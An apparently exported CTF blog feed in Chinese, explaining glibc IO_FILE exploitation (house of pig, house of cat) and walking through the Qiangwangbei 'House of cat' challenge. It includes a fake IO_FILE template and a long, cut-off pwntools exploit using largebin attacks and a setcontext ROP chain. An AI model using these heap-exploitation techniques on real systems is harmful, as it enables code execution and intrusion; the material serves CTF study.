pig</h2><ul><li><p>用于程序中只有<code>calloc</code>而没有<code>malloc</code>的情况</p></li><li><p>通常需要<strong>一次largebin attack</strong>以完成tcache stashing unlink attack的准备</p></li><li><p>需要<strong>一次tcache stashing unlink attack</strong></p></li></ul><p>调用虚表<code>_IO_str_jumps</code> -&gt; <code>_IO_str_overflow</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> _IO_str_overflow (FILE *fp, <span class="type">int</span> c)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> flush_only = c == EOF;</span><br><span class="line">  <span class="type">size_t</span> pos;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_WRITES)</span><br><span class="line">      <span class="keyword">return</span> flush_only ? <span class="number">0</span> : EOF;</span><br><span class="line">  <span class="keyword">if</span> ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;</span><br><span class="line">      fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end;</span><br><span class="line">    &#125;</span><br><span class="line">  pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;</span><br><span class="line">  <span class="keyword">if</span> (pos &gt;= (<span class="type">size_t</span>) (_IO_blen (fp) + flush_only))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_USER_BUF) <span class="comment">/* not allowed to enlarge */</span></span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="type">char</span> *new_buf;</span><br><span class="line">          <span class="type">char</span> *old_buf = fp-&gt;_IO_buf_base;</span><br><span class="line">          <span class="type">size_t</span> old_blen = _IO_blen (fp);</span><br><span class="line">          <span class="type">size_t</span> new_size = <span class="number">2</span> * old_blen + <span class="number">100</span>;</span><br><span class="line">          <span class="keyword">if</span> (new_size &lt; old_blen)</span><br><span class="line">            <span class="keyword">return</span> EOF;</span><br><span class="line">          new_buf = <span class="built_in">malloc</span> (new_size); <span class="comment">// 1</span></span><br><span class="line">          <span class="keyword">if</span> (new_buf == <span class="literal">NULL</span>)</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="comment">/*      __ferror(fp) = 1; */</span></span><br><span class="line">              <span class="keyword">return</span> EOF;</span><br><span class="line">            &#125;</span><br><span class="line">          <span class="keyword">if</span> (old_buf)</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="built_in">memcpy</span> (new_buf, old_buf, old_blen); <span class="comment">// 2</span></span><br><span class="line">              <span class="built_in">free</span> (old_buf); <span class="comment">// 3</span></span><br><span class="line">              <span class="comment">/* Make sure _IO_setb won&#x27;t try to delete _IO_buf_base. */</span></span><br><span class="line">              fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line">            &#125;</span><br><span class="line">          <span class="built_in">memset</span> (new_buf + old_blen, <span class="string">&#x27;\0&#x27;</span>, new_size - old_blen); <span class="comment">// 4</span></span><br><span class="line"> </span><br><span class="line">          _IO_setb (fp, new_buf, new_buf + new_size, <span class="number">1</span>);</span><br><span class="line">          fp-&gt;_IO_read_base = new_buf + (fp-&gt;_IO_read_base - old_buf);</span><br><span class="line">          fp-&gt;_IO_read_ptr = new_buf + (fp-&gt;_IO_read_ptr - old_buf);</span><br><span class="line">          fp-&gt;_IO_read_end = new_buf + (fp-&gt;_IO_read_end - old_buf);</span><br><span class="line">          fp-&gt;_IO_write_ptr = new_buf + (fp-&gt;_IO_write_ptr - old_buf);</span><br><span class="line"> </span><br><span class="line">          fp-&gt;_IO_write_base = new_buf;</span><br><span class="line">          fp-&gt;_IO_write_end = fp-&gt;_IO_buf_end;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (!flush_only)</span><br><span class="line">    *fp-&gt;_IO_write_ptr++ = (<span class="type">unsigned</span> <span class="type">char</span>) c;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_read_end)</span><br><span class="line">    fp-&gt;_IO_read_end = fp-&gt;_IO_write_ptr;</span><br><span class="line">  <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_str_overflow)</span><br></pre></td></tr></table></figure><blockquote><p>打tcache stashing没有<code>malloc</code>取不出chunk怎么办？</p><p>我有<code>_IO_str_overflow</code>！！！（自豪）</p></blockquote><p>这个函数中，完美达成<code>malloc</code>、<code>memcpy</code>、<code>free</code>一条龙服务</p><p>什么？你的版本太高打不了<code>free_hook</code>？</p><p>没关系，最后还有一个<code>memset</code>可以写libc中的got表</p><p>如果需要打orw，<code>rdx</code>也是可控的</p><p><img src="/../img/IOFILE-exploit.assets/image-20230811214840282.png" alt="image-20230811214840282"></p><p><code>&lt;+53&gt;mov rdx, QWORD PTR [rdi+0x28]</code></p><p><code>rdi</code>指向<code>_flags</code>，<code>rdi+0x28</code>指向<code>_IO_write_ptr</code>，可控</p><p>详细题解可以看<a href="https://deepunk42.github.io/2023/07/27/xctf2021finalhouseofpig%E5%A4%8D%E7%8E%B0/">另一篇博客</a></p><h2 id="house-of-cat"><a href="#house-of-cat" class="headerlink" title="house of cat"></a>house of cat</h2><p>只需要<strong>一次</strong>任意写！</p><p>调用虚表<code>_IO_wfile_jumps</code>中的<code>_IO_wfile_seekoff</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">off64_t</span></span><br><span class="line">_IO_wfile_seekoff (FILE *fp, <span class="type">off64_t</span> offset, <span class="type">int</span> dir, <span class="type">int</span> mode)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">off64_t</span> result;</span><br><span class="line">  <span class="type">off64_t</span> delta, new_offset;</span><br><span class="line">  <span class="type">long</span> <span class="type">int</span> count;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (mode == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> do_ftell_wide (fp);</span><br><span class="line">  <span class="type">int</span> must_be_exact = ((fp-&gt;_wide_data-&gt;_IO_read_base</span><br><span class="line">            == fp-&gt;_wide_data-&gt;_IO_read_end)</span><br><span class="line">               &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_base</span><br><span class="line">               == fp-&gt;_wide_data-&gt;_IO_write_ptr));</span><br><span class="line">#需要绕过was_writing的检测</span><br><span class="line">  <span class="type">bool</span> was_writing = ((fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">               &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class="line">              || _IO_in_put_mode (fp));</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (was_writing &amp;&amp; _IO_switch_to_wget_mode (fp))</span><br><span class="line">    <span class="keyword">return</span> WEOF;</span><br><span class="line">......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最终目的是调用<code>_IO_switch_to_wget_mode</code>函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">► 0x7fbbb9489d30 &lt;_IO_switch_to_wget_mode&gt;       endbr64</span><br><span class="line">  0x7fbbb9489d34 &lt;_IO_switch_to_wget_mode+4&gt;     mov    rax, qword ptr [rdi + 0xa0]</span><br><span class="line">  0x7fbbb9489d3b &lt;_IO_switch_to_wget_mode+11&gt;    push   rbx</span><br><span class="line">  0x7fbbb9489d3c &lt;_IO_switch_to_wget_mode+12&gt;    mov    rbx, rdi</span><br><span class="line">  0x7fbbb9489d3f &lt;_IO_switch_to_wget_mode+15&gt;    mov    rdx, qword ptr [rax + 0x20]</span><br><span class="line">  0x7fbbb9489d43 &lt;_IO_switch_to_wget_mode+19&gt;    cmp    rdx, qword ptr [rax + 0x18]</span><br><span class="line">  0x7fbbb9489d47 &lt;_IO_switch_to_wget_mode+23&gt;    jbe    _IO_switch_to_wget_mode+56                </span><br><span class="line">  0x7fbbb9489d49 &lt;_IO_switch_to_wget_mode+25&gt;    mov    rax, qword ptr [rax + 0xe0]</span><br><span class="line">  0x7fbbb9489d50 &lt;_IO_switch_to_wget_mode+32&gt;    mov    esi, 0xffffffff</span><br><span class="line">  0x7fbbb9489d55 &lt;_IO_switch_to_wget_mode+37&gt;    call   qword ptr [rax + 0x18]</span><br></pre></td></tr></table></figure><p>这里call了一个<code>rax</code>相关的地址，而<code>rax</code>由<code>rdi</code>决定</p><p>再说调用条件，需要满足两个</p><ol><li><p><code>was_writing == 1</code></p><p>即fp-&gt;<code>_wide_data</code>-&gt;<code>_IO_write_ptr</code>    &gt;  fp-&gt;<code>_wide_data</code>-&gt;<code>_IO_write_base</code></p><p>这里用到了前面提到的<code>_wide_data</code>跳表，可以直接伪造so easy</p></li><li><p><code>mode!=0</code></p><p><code>rcx</code>&#x3D;&gt;<code>mode</code></p><p>如果无法满足，可以再做一个FILE结构体，进入第二个结构体时就置好了，详细内容参考<a href="https://phot0n.com/2022/09/06/%E9%AB%98%E7%89%88%E6%9C%AC%E7%9A%84%E5%A0%86%E5%88%A9%E7%94%A8%E4%B8%8EFSOP/">Photon的博客</a></p></li></ol><p>构造挺麻烦的，理解之后可以直接上别人的模板</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">fake_io_addr=heapbase+<span class="number">0xb00</span> # 伪造的fake_IO结构体的地址</span><br><span class="line">next_chain = <span class="number">0</span></span><br><span class="line">fake_IO_FILE=p64(rdi)         #_flags=rdi</span><br><span class="line">fake_IO_FILE+=p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">fake_IO_FILE +=p64(<span class="number">1</span>)+p64(<span class="number">2</span>) <span class="meta"># rcx!=0(FSOP)</span></span><br><span class="line">fake_IO_FILE +=p64(fake_io_addr+<span class="number">0xb0</span>)#_IO_backup_base=rdx</span><br><span class="line">fake_IO_FILE +=p64(call_addr)#_IO_save_end=call addr(call setcontext/system)</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x68</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)  # _chain</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x88</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(heapbase+<span class="number">0x1000</span>)  # _lock = a writable address</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xa0</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE +=p64(fake_io_addr+<span class="number">0x30</span>)#_wide_data,rax1_addr</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xc0</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">1</span>) <span class="meta">#mode=1</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xd8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(libcbase+<span class="number">0x2160c0</span>+<span class="number">0x10</span>)  <span class="meta"># vtable=IO_wfile_jumps+0x10</span></span><br><span class="line">fake_IO_FILE +=p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">fake_IO_FILE += p64(fake_io_addr+<span class="number">0x40</span>)  # rax2_addr</span><br></pre></td></tr></table></figure><p>详细题解可以看<a href="https://deepunk42.github.io/2023/07/27/house-of-cat/">另一篇博客</a></p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>House of cat强网杯复现</title>
      <link href="/house-of-cat/"/>
      <url>/house-of-cat/</url>
      
        <content type="html"><![CDATA[<blockquote><p>最后一天的题，水水</p></blockquote><h2 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h2><h3 id="格式检查"><a href="#格式检查" class="headerlink" title="格式检查"></a>格式检查</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">LOGIN | r00t QWBQWXFadmin</span><br><span class="line">CAT | r00t QWBQWXF$\xff</span><br></pre></td></tr></table></figure><h3 id="功能分析"><a href="#功能分析" class="headerlink" title="功能分析"></a>功能分析</h3><h4 id="add"><a href="#add" class="headerlink" title="add"></a>add</h4><p>index在0到15间</p><p>0x418&lt;&#x3D; size &lt;&#x3D;0x46f</p><p>使用calloc</p><h4 id="delet"><a href="#delet" class="headerlink" title="delet"></a>delet</h4><p>UAF</p><h4 id="show"><a href="#show" class="headerlink" title="show"></a>show</h4><p>write 0x30</p><h4 id="edit"><a href="#edit" class="headerlink" title="edit"></a>edit</h4><p>限制2次</p><p>每次只能修改<strong>0x30</strong></p><h2 id="攻击流程分析"><a href="#攻击流程分析" class="headerlink" title="攻击流程分析"></a>攻击流程分析</h2><p>由于不存在对exit的调用，且在main函数中无限循环，故无法进行FSOP</p><p>可以采用house of kiwi的触发IO思路，利用<code>__malloc_assert</code>调用<code>fflush(stderr)</code>或者<code>__fxprintf</code></p><p>所以需要攻击位于stderr上的指针，恰好本题该地址可写，这里使用一次largebin attack</p><p>另外，要触发<code>__malloc_assert</code>，需要修改topchunk的size</p><p>本题由于edit有长度限制，不方便使用之前构造堆重叠的方式，所以这里可以用第二次largebin attack攻击size</p><p>恰好共有两次edit机会，刚好用完e</p><p>另外，攻击top size时要注意，在将第二个chunk加入largebin时，不能改变top chunk的位置。也就是说，不能通过分配一个更大chunk的方式来得到第二个largechunk</p><p>这是因为对largebin进行unlink的操作在从topchunk分配chunk之前，此时修改过的size会被新的size覆盖掉。</p><p>所以这一步入largebin的操作，可以通过分配更小的chunk获得</p><p><img src="/../img/house-of-cat.assets/image-20230726120735530.png" alt="image-20230726120735530"></p><p>开了沙箱，禁用了execve，并检查read的fd是否为0</p><p>故只能打orw, 并且在open前需要先close(0)</p><h2 id="堆风水"><a href="#堆风水" class="headerlink" title="堆风水"></a>堆风水</h2><p>需要达到的效果是：两次largebin attack，分别使stderr指向可控内容的堆块、修改topchunk</p><p>看似比较简单，但需注意edit只能修改0x30，且只有两次机会</p><p>所以对伪造结构体内容的写入需要在add操作进行，入largebin之后对前6个地址会有覆盖，实测下来对IO利用没有影响</p><h2 id="IO利用流程分析"><a href="#IO利用流程分析" class="headerlink" title="IO利用流程分析"></a>IO利用流程分析</h2><p>_wide_data&#x3D;fake_io_addr+0x30</p><p>1.将[rdi+0xa0]<code>_wide_data</code>处的内容赋值给rax，为了避免与下面的rax混淆，称之为<strong>rax1</strong>。<br>2.将新赋值的[rax1+0x20]<code>_IO_backup_base</code>处的内容赋值给rdx。<br>3.将[rax1+0xe0]</p><p>处的内容赋值给rax，称之为<strong>rax2</strong>。<br>4.call调用[rax2+0x18]处的内容。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">_wide_data-&gt;_IO_read_ptr ！=_wide_data-&gt;_IO_read_end</span><br><span class="line">_wide_data-&gt;_IO_write_ptr &gt; _wide_data-&gt;_IO_write_base</span><br><span class="line">#如果_wide_data=fake_io_addr+<span class="number">0x30</span>，其实也就是fp-&gt;_IO_save_base &lt; f-&gt;_IO_backup_base</span><br><span class="line">fp-&gt;_lock是一个可写地址（堆地址、libc中的可写地址</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>, terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;new-window&#x27;</span>])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">cmd=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">cmd += <span class="string">&quot;b main\n&quot;</span></span><br><span class="line">gdb.attach(p, cmd)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">host = <span class="string">&quot;&quot;</span></span><br><span class="line">port = <span class="number">0</span></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(host, port)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">login = <span class="string">&quot;LOGIN | r00t QWB QWXFadmin&quot;</span></span><br><span class="line">cat = <span class="string">&quot;CAT | r00t QWB QWXF$\xff&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index, size, content</span>):</span><br><span class="line">p.sendafter(<span class="string">&quot;mew~~~~~~\n&quot;</span>, cat)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;cat\n&quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;idx:\n&quot;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line">p.sendlineafter(<span class="string">&quot;size:\n&quot;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">p.sendafter(<span class="string">&quot;content:\n&quot;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">p.sendafter(<span class="string">&quot;mew~~~~~~\n&quot;</span>, cat)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;cat\n&quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;idx:\n&quot;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">p.sendafter(<span class="string">&quot;mew~~~~~~\n&quot;</span>, cat)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;cat\n&quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;idx:\n&quot;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, content</span>):</span><br><span class="line">p.sendafter(<span class="string">&quot;mew~~~~~~\n&quot;</span>, cat)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;cat\n&quot;</span>, <span class="string">&quot;4&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;idx:\n&quot;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line">p.sendafter(<span class="string">&quot;content:\n&quot;</span>,content)</span><br><span class="line"></span><br><span class="line">p.send(login)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x420</span>, cyclic(<span class="number">0x420</span>))<span class="comment">#largechunk 0</span></span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x440</span>, cyclic(<span class="number">0x440</span>))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x450</span>, cyclic(<span class="number">0x450</span>))</span><br><span class="line">show(<span class="number">0</span>)<span class="comment">#leak largechunk</span></span><br><span class="line"></span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))-<span class="number">0x21a0d0</span></span><br><span class="line">stderr_addr = libc_base + <span class="number">0x21a860</span></span><br><span class="line">setcontext61 = libc_base + <span class="number">0x53a6d</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;\x7f\x00\x00&quot;</span>)</span><br><span class="line">heap_base = u64(p.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))-<span class="number">0x290</span></span><br><span class="line">log.success(<span class="string">&quot;libc_base = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line">log.success(<span class="string">&quot;heap0_base = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(heap_base)))</span><br><span class="line">log.success(<span class="string">&quot;stderr_addr = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(stderr_addr)))</span><br><span class="line"></span><br><span class="line">ret = <span class="number">0x0000000000029cd6</span>+libc_base</span><br><span class="line">pop_rdi = <span class="number">0x000000000002a3e5</span>+libc_base</span><br><span class="line">pop_rsi = <span class="number">0x000000000002be51</span>+libc_base</span><br><span class="line">pop_rax = <span class="number">0x0000000000045eb0</span> + libc_base</span><br><span class="line">syscall = <span class="number">0x0000000000091396</span> + libc_base</span><br><span class="line"></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line"><span class="comment">#fake stderr----------------------------------------</span></span><br><span class="line">fake_stderr = heap_base + <span class="number">0xf70</span></span><br><span class="line">fake_rdx = fake_stderr + <span class="number">0x10</span> + <span class="number">0x200</span></span><br><span class="line">fake_stack = fake_stderr + <span class="number">0x10</span> + <span class="number">0x320</span></span><br><span class="line">io = p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">io += p64(<span class="number">1</span>) + p64(<span class="number">2</span>)<span class="comment">#rcx!=0</span></span><br><span class="line">io += p64(fake_rdx)<span class="comment">#backup_base rdx</span></span><br><span class="line">io += p64(setcontext61)</span><br><span class="line">io = io.ljust(<span class="number">0x78</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">io += p64(libc_base+<span class="number">0x21ba60</span>)<span class="comment">#lock</span></span><br><span class="line">io = io.ljust(<span class="number">0x90</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">io += p64(fake_stderr+<span class="number">0x30</span>)<span class="comment">#wide_data rax1</span></span><br><span class="line">io = io.ljust(<span class="number">0xb0</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">io += p64(<span class="number">1</span>)<span class="comment">#mode</span></span><br><span class="line">io = io.ljust(<span class="number">0xc8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">io += p64(libc_base+libc.sym[<span class="string">&#x27;_IO_wfile_jumps&#x27;</span>]+<span class="number">0x10</span>)</span><br><span class="line">io += p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">io += p64(fake_stderr+<span class="number">0x40</span>)</span><br><span class="line">io = io.ljust(<span class="number">0x200</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line"><span class="comment">#fake rdx:</span></span><br><span class="line">payload = <span class="string">&quot;./flag\x00\x00&quot;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x68</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)<span class="comment">#rdi-&gt;0</span></span><br><span class="line">payload += p64(<span class="number">0</span>)<span class="comment">#rsi-&gt;0</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x88</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(<span class="number">0x100</span>)<span class="comment">#rdx-&gt;0</span></span><br><span class="line">payload = payload.ljust(<span class="number">0xa0</span>)</span><br><span class="line">payload += p64(fake_stack)<span class="comment">#rsp-&gt;chunk 1</span></span><br><span class="line">payload += p64(ret)<span class="comment">#rcx-&gt;ret</span></span><br><span class="line">io += payload</span><br><span class="line">io = 